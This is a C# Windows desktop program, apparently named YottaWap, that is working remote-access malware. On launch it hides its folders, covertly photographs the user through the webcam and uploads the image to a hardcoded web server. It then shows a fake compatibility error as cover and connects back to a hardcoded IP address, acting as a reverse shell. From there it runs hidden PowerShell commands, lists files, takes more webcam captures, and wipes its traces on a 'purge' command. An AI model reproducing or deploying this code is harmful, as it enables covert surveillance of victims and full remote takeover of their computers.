﻿using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using Emgu.CV;
using Ionic.Zip;

namespace YottaWap
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            ExecuteCode();
        }

        string remoteControlServer = "https://www.wesdb.com/upload.php";
        int i = 1;
        string mainPath;
        string sessionPrefix = "";
        string remoteIp = "45.79.102.237";
        string shellWorkingDirectory = "C:\\";
        bool powershellMode = false;

        public enum ErrorCodes
        {
            DirCreationError0x01 = 1,
            DirCreationError0x02 = 2,
            DirCreationError0x03 = 3,
            DirCreationSuccess = 4,
            GetVideoCapError = 5,

        }

        void ExitWithError(ErrorCodes err)
        {
            Environment.Exit((int)err);
        }


        ErrorCodes CreateDirs()
        {
            string currentDir = Directory.GetCurrentDirectory();
            string programDir;
            if (Directory.Exists(currentDir))
            {
                DirectoryInfo di = Directory.CreateDirectory(currentDir + "/YottaWap");
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden | FileAttributes.System; // | FileAttributes.System;
                if (Directory.Exists(currentDir + "/YottaWap"))
                {
                    programDir = currentDir + "/YottaWap";
                }
                else
                {
                    return ErrorCodes.DirCreationError0x01;
                }
            }
            else
            {
                return ErrorCodes.DirCreationError0x02;
            }
            string[] dirsToCreate = { "Videos", "Keys", "Audio", "Other", "Data", "Data/Captures", "Logs" };
            foreach (string dir in dirsToCreate)
            {
                DirectoryInfo di = Directory.CreateDirectory(programDir + "/" + dir);
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden | FileAttributes.System; // | FileAttributes.System;
                if (!Directory.Exists(programDir + "/" + dir))
                {
                    return ErrorCodes.DirCreationError0x03;
                }
            }
            return ErrorCodes.DirCreationSuccess;
        }

        VideoCapture? GetVideoCap()
        {
            VideoCapture cap = new VideoCapture(0);
            return cap;
        }

        void WriteError(string msg)
        {
            try
            {
                string dataToAppend = "[ " + DateTime.Now.ToString() + " ]\n";
                File.AppendAllText(mainPath + "Logs/Errors.txt", dataToAppend);
            }
            catch (Exception ex2)
            {
                Console.WriteLine(ex2.Message);
            }
        }
        void WriteLog(string msg)
        {
            try
            {
                string dataToAppend = "[ " + DateTime.Now.ToString() + " ], " + msg + "\n";
                File.AppendAllText(mainPath + "Logs/Logs.txt", dataToAppend);
            }
            catch (Exception)
            {
                Console.WriteLine(msg);
            }
        }
        void UploadFirst()
        {
            try
            {
                // Capture Image
                VideoCapture cap = new VideoCapture(0);
                Mat image = new Mat();


                if (cap.IsOpened)
                {
                    image = cap.QueryFrame();
                    if (!image.IsEmpty)
                    {
                        image.Save(mainPath + "Data/Captures/capture-0-" + sessionPrefix + ".jpg");
                    }
                }
                image.Dispose();
                cap.Dispose();

                ZipFile zip = new ZipFile();
                zip.AddFile(mainPath + "Data/Captures/capture-0-" + sessionPrefix + ".jpg", "/");
                zip.Save(mainPath + "CapturesToUpload.zip");
                zip.Dispose();


                WebClient Client = new WebClient();

                Client.Headers.Add("Content-Type", "binary/octet-stream");
                Client.UploadFile(remoteControlServer, mainPath + "CapturesToUpload.zip");
                Client.Dispose();
                WriteLog("Ok.");
            }
            catch
            {

            }
        }
        void ShowMessageBox()
        {
            var thread = new Thread(
              () =>
              {
                  MessageBox.Show("An error has occured. This software is not compatible with your version of windows.", "ERROR 0xf168ac34");
              });
            thread.Start();
        }

        string CaptureImage()
        {
            VideoCapture cap = new VideoCapture(0);
            Mat image = new Mat();


            if (cap.IsOpened)
            {
                image = cap.QueryFrame();
                if (!image.IsEmpty)
                {
                    image.Save(mainPath + "Data/Captures/capture-" + i.ToString() + "-" + sessionPrefix + ".jpg");
                }
            }
            image.Dispose();
            cap.Dispose();
            return mainPath + "Data/Captures/capture-" + i.ToString() + "-" + sessionPrefix + ".jpg";
        }

        void UploadFiles(List<string> filesToUpload)
        {

            File.WriteAllLines(mainPath + "FileOutput.txt", filesToUpload.ToArray());

            ZipFile zip = new ZipFile();
            zip.AddFiles(filesToUpload, "/");
            zip.Save(mainPath + "CapturesToUpload.zip");
            zip.Dispose();


            WebClient Client = new WebClient();

            Client.Headers.Add("Content-Type", "binary/octet-stream");
            Client.UploadFile(remoteControlServer, mainPath + "CapturesToUpload.zip");
            Client.Dispose();
        }
        void UploadFile(string filepath)
        {
            List<string> tmp = new List<string>();
            tmp.Add(filepath);
            UploadFiles(tmp);
            return;
        }

        bool IsConnected(TcpClient _tcpClient)
        {
            try
            {
                if (_tcpClient != null && _tcpClient.Client != null && _tcpClient.Client.Connected)
                {
                    /* pear to the documentation on Poll:
                     * When passing SelectMode.SelectRead as a parameter to the Poll method it will return 
                     * -either- true if Socket.Listen(Int32) has been called and a connection is pending;
                     * -or- true if data is available for reading; 
                     * -or- true if the connection has been closed, reset, or terminated; 
                     * otherwise, returns false
                     */

                    // Detect if client disconnected
                    if (_tcpClient.Client.Poll(0, SelectMode.SelectRead))
                    {
                        byte[] buff = new byte[1];
                        if (_tcpClient.Client.Receive(buff, SocketFlags.Peek) == 0)
                        {
                            // Client disconnected
                            return false;
                        }
                        else
                        {
                            return true;
                        }
                    }

                    return true;
                }
                else
                {
                    return false;
                }
            }
            catch
            {
                return false;
            }
        }
        string ExecutePowerShell(string command)
        {
            try
            {
                if (command == null || command == "")
                {
                    return "";
                }
                Process p = new Process();
                // Redirect the output stream of the child process.
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.WorkingDirectory = shellWorkingDirectory;
                p.StartInfo.CreateNoWindow = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.FileName = "powershell.exe";
                p.StartInfo.Arguments = command;
                p.StartInfo.RedirectStandardOutput = true;
                p.Start();

                // Do not wait for the child process to exit before
                // reading to the end of its redirected stream.
                // p.WaitForExit();
                // Read the output stream first and then wait.
                string output = p.StandardOutput.ReadToEnd();
                p.WaitForExitAsync();
                return output;
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }
        string ExecuteCommand(string command)
        {
            try
            {
                command = command.Trim();
                if (command != "mode default" && powershellMode)
                {
                    string[] parts = command.Split(' ');
                    if (parts[0] == "cd")
                    {
                        string moveTo = command.Substring(2).Replace("/", "\\").Trim();

                        if (parts.Length == 1)
                        {
                            string? path = Environment.GetEnvironmentVariable("USERPROFILE");
                            if (path != null)
                            {
                                shellWorkingDirectory = path;
                                return "";
                            }
                            else
                            {
                                return "%USERPROFILE% variable = null";
                            }

                        }
                        if (!moveTo.Substring(1).StartsWith(":") && !moveTo.StartsWith("\\"))
                        {
                            if (shellWorkingDirectory.EndsWith("\\") && !moveTo.StartsWith("\\"))
                            {
                                shellWorkingDirectory += moveTo;
                            }
                            if (!shellWorkingDirectory.EndsWith("\\"))
                            {
                                shellWorkingDirectory += "\\" + moveTo;
                            }
                        }
                        else if (moveTo.StartsWith("\\"))
                        {
                            shellWorkingDirectory = "C:\\";
                        }
                        else
                        {
                            return "Invalid path: \"" + shellWorkingDirectory + moveTo + "\"";
                        }
                    }
                    return ExecutePowerShell(command);
                }
                else if (command == "mode default")
                {
                    powershellMode = false;
                }
                else
                {
                    string[] parts = command.Split(' ');
                    switch (parts[0])
                    {
                        case "exe":
                            return ExecutePowerShell(command.Substring(3));
                        case "cam":
                            string filePath = CaptureImage();
                            UploadFile(filePath);
                            break;
                        case "mode":
                            if (parts[1] == "ps")
                            {
                                powershellMode = true;
                            }
                            break;
                        case "ls":
                            return string.Join("\n", Directory.GetFileSystemEntries(shellWorkingDirectory));
                        case "cd":
                            string moveTo = command.Substring(2).Replace("/", "\\").Trim();

                            if (parts.Length == 1)
                            {
                                string? path = Environment.GetEnvironmentVariable("USERPROFILE");
                                if (path != null)
                                {
                                    shellWorkingDirectory = path;
                                    return "";
                                }
                                else
                                {
                                    return "%USERPROFILE% variable = null";
                                }

                            }
                            if (!moveTo.Substring(1).StartsWith(":") && !moveTo.StartsWith("\\"))
                            {
                                if (shellWorkingDirectory.EndsWith("\\") && !moveTo.StartsWith("\\"))
                                {
                                    shellWorkingDirectory += moveTo;
                                    break;
                                }
                                if (!shellWorkingDirectory.EndsWith("\\"))
                                {
                                    shellWorkingDirectory += "\\" + moveTo;
                                    break;
                                }
                            }
                            else if (moveTo.StartsWith("\\"))
                            {
                                shellWorkingDirectory = "C:\\";
                            }
                            else
                            {
                                return "Invalid path: \"" + shellWorkingDirectory + moveTo + "\"";
                            }
                            break;
                    }
                }
            }
            catch (Exception ex)
            {
                WriteError(ex.Message);
                return ex.Message;
            }
            return "";
        }

        int EnterLoop()
        {

            UploadFirst();
            ShowMessageBox();

            TcpClient client = new TcpClient();
            Stream? stream = null;
            StreamReader? rdr = null;
            try
            {
                client = new TcpClient();
                client.Connect(remoteIp, 5000);
                stream = client.GetStream();
                rdr = new StreamReader(stream);
            }
            catch (Exception)
            {

            }
            bool sessionActive = true;

            while (sessionActive)
            {
                try
                {
                    if (!IsConnected(client))
                    {
                        client = new TcpClient();
                        client.Connect(remoteIp, 5000);
                        stream = client.GetStream();
                        rdr = new StreamReader(stream);
                    }
                    if (rdr != null && stream != null)
                    {
                        string command = rdr.ReadLine();
                        if (command != null)
                        {
                            if (command.Trim() == "purge")
                            {
                                Directory.Delete(mainPath, true);
                                sessionActive = false;
                                byte[] sendData = Encoding.UTF8.GetBytes("Purge Successful.");
                                stream.Write(sendData, 0, sendData.Length);
                                stream.Close();
                                stream.Dispose();
                                client.Close();
                                client.Dispose();
                                rdr.Close();
                                rdr.Dispose();
                                Environment.Exit(1);
                            }
                            if (command.Trim() == "disconnect")
                            {
                                sessionActive = false;
                                stream.Close();
                                stream.Dispose();
                                client.Close();
                                client.Dispose();
                                rdr.Close();
                                rdr.Dispose();
                                Environment.Exit(2);
                            }

                            if (command != null)
                            {
                                string output = ExecuteCommand(command);
                                string prefix = "SHELL ~$ ";
                                if (powershellMode)
                                {

                                    prefix = "PS " + shellWorkingDirectory + "> ";
                                }
                                if (output != "")
                                {
                                    byte[] buffer = Encoding.UTF8.GetBytes(output + "\n" + prefix);
                                    stream.Write(buffer, 0, buffer.Length);
                                }
                                else
                                {
                                    byte[] buffer = Encoding.UTF8.GetBytes(prefix);
                                    stream.Write(buffer, 0, buffer.Length);
                                }
                            }
                        }
                    }
                    i++;

                    WriteLog("Ok.");
                }
                catch (Exception ex)
                {
                    WriteError(ex.Message);
                    i++;
                }
            }
            return 0;
        }
        void ExecuteCode()
        {
            ErrorCodes dirMadeSuccess = CreateDirs();
            if (dirMadeSuccess != ErrorCodes.DirCreationSuccess)
            {
                ExitWithError(dirMadeSuccess);
            }
            sessionPrefix = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
            mainPath = Directory.GetCurrentDirectory() + "\\YottaWap\\";
            EnterLoop();

        }
    }
}